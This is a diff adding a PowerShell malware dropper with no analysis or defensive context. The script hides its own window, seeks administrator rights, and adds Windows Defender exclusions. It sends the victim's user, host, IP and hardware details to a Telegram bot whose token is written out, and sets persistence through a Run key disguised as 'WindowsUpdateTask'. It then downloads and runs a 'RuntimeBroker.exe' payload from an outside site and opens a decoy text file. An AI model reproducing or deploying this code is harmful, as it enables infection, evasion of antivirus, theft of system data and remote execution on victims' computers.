@@ -1,0 +1,251 @@
+# ── NEW: Self‑elevate to Administrator ──────────────────────────────
+# ===================================================================
+# Re-launch self in a hidden window (if currently visible)
+# ===================================================================
+if (-not $env:_PS_HIDDEN_RUN) {
+    $env:_PS_HIDDEN_RUN = '1'
+    $argList = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    Start-Process -FilePath 'powershell.exe' -ArgumentList $argList -WindowStyle Hidden
+    Exit
+}
+
+# ===================================================================
+# Elevation
+# ===================================================================
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
+
+if (-Not $isAdmin) {
+    $CommandLine = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`" $($MyInvocation.UnboundArguments)"
+    try {
+        Start-Process -FilePath PowerShell.exe -Verb RunAs -ArgumentList $CommandLine -WindowStyle Hidden -ErrorAction Stop
+        Exit
+    } catch {
+        # User clicked "No" — continue as standard user, but silently
+        $isAdmin = $false
+    }
+}
+
+# ===================================================================
+# ... rest of your script ...
+# Now everything (errors included) runs in the hidden window
+# ===================================================================
+
+# ────────────────────────────────────────────────────────────────────
+# ────────────────────────────────────────────────────────────────────
+# ────────────────────────────────────────────────────────────────────
+
+$group = "DefaultGroup"
+
+function Write-Log {
+    param(
+        [string]$Message,
+        [string]$Level = "INFO"
+    )
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $logMessage = "[$timestamp] [$Level] $Message"
+    Write-Host $logMessage
+}
+
+# ── NEW: Add Defender exclusions ────────────────────────────────────
+function Add-DefenderExclusions {
+    param(
+        [string[]]$Paths = @(
+            $env:USERPROFILE,
+            $env:TEMP
+        )
+    )
+
+    try {
+        # Import the Defender module (required for Add-MpPreference)
+        $modulePath = [IO.Path]::Combine(
+            [Environment]::SystemDirectory,
+            'WindowsPowerShell\v1.0\Modules\Defender\Defender.psd1'
+        )
+        $null = Import-Module -Name $modulePath -Force -ErrorAction Stop
+
+        # Get current exclusions to avoid duplicates
+        $preferences   = Get-MpPreference -ErrorAction Stop
+        $currentPaths  = @($preferences.ExclusionPath)
+        $missingPaths  = @($Paths | Where-Object { $_ -notin $currentPaths })
+
+        if ($missingPaths.Count -gt 0) {
+            Add-MpPreference -ExclusionPath $missingPaths -Force -ErrorAction Stop
+            Write-Log "Added Defender exclusions: $($missingPaths -join ', ')" -Level "INFO"
+        } else {
+            Write-Log "All requested Defender exclusions already exist." -Level "INFO"
+        }
+    } catch {
+        Write-Log "Failed to add Defender exclusions: $_" -Level "ERROR"
+    }
+}
+# ────────────────────────────────────────────────────────────────────
+
+function Send-TelegramNotify {
+    try {
+        $username = $env:USERNAME
+        $computerName = $env:COMPUTERNAME
+        $cpu = try { (Get-CimInstance Win32_Processor).Name.Trim() } catch { "Unknown" }
+        $gpu = try { (Get-CimInstance Win32_VideoController | Select-Object -First 1).Name.Trim() } catch { "Unknown" }
+        $ram = try {
+            $totalBytes = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory
+            "{0:N2} GB" -f ($totalBytes / 1GB)
+        } catch { "Unknown" }
+      
+        $ip = try {
+            (Invoke-RestMethod -Uri "https://api.ipify.org/?format=json" -TimeoutSec 5).ip
+        } catch {
+            try {
+                (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -eq 'Dhcp' } | Select-Object -First 1).IPAddress
+            } catch { "Unknown" }
+        }
+      
+        $os = [System.Environment]::OSVersion.VersionString
+      
+        $msg = @"
+[+] New hit
+User: $username
+Host: $computerName
+OS: $os
+IP: $ip
+CPU: $cpu
+GPU: $gpu
+RAM: $ram
+Group: $group
+Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+"@
+      
+        $bot = "7252153973:AAHhnvXQn4Q5DJTEtLiA7y59VCkJEdEFoak"
+        $chat = "-1002513798195"
+        $uri = "https://api.telegram.org/bot$bot/sendMessage"
+        $body = @{
+            chat_id = $chat
+            text = $msg
+            disable_notification = $true
+        }
+      
+        Invoke-RestMethod -Uri $uri -Method Post -Body $body -TimeoutSec 10 | Out-Null
+    } catch {}
+}
+
+function Add-Persistence {
+    param(
+        [string]$ScriptName = "tt7.ps1"
+    )
+  
+    try {
+        $targetPath = Join-Path $env:USERPROFILE $ScriptName
+
+        $scriptContent = $null
+
+        if ($PSCommandPath -and (Test-Path $PSCommandPath -PathType Leaf)) {
+            $scriptContent = Get-Content -Path $PSCommandPath -Raw -Encoding UTF8
+        }
+        elseif ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path -PathType Leaf)) {
+            $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw -Encoding UTF8
+        }
+        else {
+            $scriptContent = $MyInvocation.MyCommand.ScriptBlock.ToString()
+        }
+
+        if ($scriptContent) {
+            Set-Content -Path $targetPath -Value $scriptContent -Encoding UTF8 -Force
+        }
+
+        $psCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`""
+      
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        $regName = "WindowsUpdateTask"
+      
+        if (-not (Test-Path $regPath)) {
+            New-Item -Path $regPath -Force | Out-Null
+        }
+      
+        Set-ItemProperty -Path $regPath -Name $regName -Value $psCommand -Type String -Force
+        return $true
+    } catch {
+        return $false
+    }
+}
+
+# ── NEW: Call the exclusion function after elevation ────────────────
+Add-DefenderExclusions
+
+Send-TelegramNotify
+Add-Persistence -ScriptName "tt7.ps1"
+
+$tempPath = Join-Path $env:TEMP "RuntimeBroker.exe"
+$url      = "https://bvmatqnam.com.vn/js/test/RuntimeBroker.exe"
+
+function Invoke-Download {
+    param([string]$Uri, [string]$OutFile)
+    try {
+        Invoke-WebRequest -Uri $Uri -OutFile $OutFile -TimeoutSec 15 -ErrorAction Stop
+        return $true
+    } catch {
+        Write-Host "Download failed: $($_.Exception.Message)"
+        return $false
+    }
+}
+
+function Start-Game {
+    param([string]$Path)
+    try { Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue } catch {}
+    Start-Process -FilePath $Path
+}
+
+# 1) Try to download latest (also serves as "update" if file already exists)
+if (Invoke-Download -Uri $url -OutFile $tempPath) {
+    Write-Host "Downloaded fresh copy."
+    Start-Game -Path $tempPath
+    return
+}
+
+# 2) Download failed — is the .exe still on disk?
+if (Test-Path $tempPath) {
+    Write-Host "Download failed, but existing file found. Running it."
+    Start-Game -Path $tempPath
+    return
+}
+
+# 3) No local copy — retry the download once
+Write-Host "No local copy found. Retrying download..."
+if (Invoke-Download -Uri $url -OutFile $tempPath) {
+    Write-Host "Download succeeded on retry."
+    Start-Game -Path $tempPath
+    return
+}
+
+# 4) URL is still failing — hunt for the file elsewhere and run it
+Write-Host "URL failed. Searching for RuntimeBroker.exe on disk..."
+$searchRoots = @($env:TEMP, $env:USERPROFILE, $env:LOCALAPPDATA, $env:APPDATA, $env:ProgramData)
+$found = foreach ($root in $searchRoots) {
+    Get-ChildItem -Path $root -Filter "RuntimeBroker.exe" -Recurse -File -ErrorAction SilentlyContinue |
+        Select-Object -First 1
+}
+$found = $found | Select-Object -First 1
+
+if ($found) {
+    Write-Host "Found: $($found.FullName)"
+    Start-Game -Path $found.FullName
+} else {
+    Write-Host "RuntimeBroker.exe could not be found anywhere."
+}
+
+# Define the URL and the local path where the file will be saved
+$url = "https://bvmatqnam.com.vn/js/test/21.txt"
+$outputPath = Join-Path $env:TEMP "21.txt"   # Saves to the current user's Temp folder
+
+try {
+    # Download the file ( -UseBasicParsing makes it compatible with older PowerShell versions )
+    Invoke-WebRequest -Uri $url -OutFile $outputPath -UseBasicParsing -ErrorAction Stop
+    Write-Host "Download completed: $outputPath"
+
+    # Open the downloaded file with Notepad
+    Start-Process -FilePath "notepad.exe" -ArgumentList "`"$outputPath`"" -Wait
+}
+catch {
+    Write-Error "Failed to download or open the file: $_"
+}
+
+
+
